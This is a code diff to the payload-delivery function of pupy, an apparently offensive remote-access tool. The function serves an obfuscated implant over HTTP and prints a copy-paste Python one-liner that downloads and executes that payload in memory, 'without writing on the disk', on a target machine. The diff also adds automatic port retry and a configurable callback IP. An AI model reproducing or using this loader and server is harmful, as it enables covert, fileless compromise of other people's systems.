@@ -41,12 +41,7 @@ def pack_py_payload(conf):
     return compress_encode_obfs('\n'.join(fullpayload)+"\n")
 
 
-def serve_payload(payload, ip="0.0.0.0", port=8080):
-    print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
-    print " --- "
-    oneliner=colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(get_local_ip(), port), "green")
-    print oneliner
-    print " --- "
+def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
     class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             self.send_response(200)
@@ -56,8 +51,23 @@ def serve_payload(payload, ip="0.0.0.0", port=8080):
             self.wfile.write(payload)
             return
     try:
-        server = HTTPServer((ip, port), PupyPayloadHTTPHandler)
-        print colorize("[+] ","green")+'Started httpserver on port ' , port
+        while True:
+            try:
+                server = HTTPServer((ip, port), PupyPayloadHTTPHandler)
+                break
+            except Exception as e:
+                # [Errno 98] Adress already in use
+                if e[0] == 98:
+                    port+=1
+                else:
+                    raise
+        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
+        print " --- "
+        oneliner=colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(link_ip, port), "green")
+        print oneliner
+        print " --- "
+
+        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
         print colorize("[+] ","green")+'waiting for a connection ...'
         server.serve_forever()
     except KeyboardInterrupt:
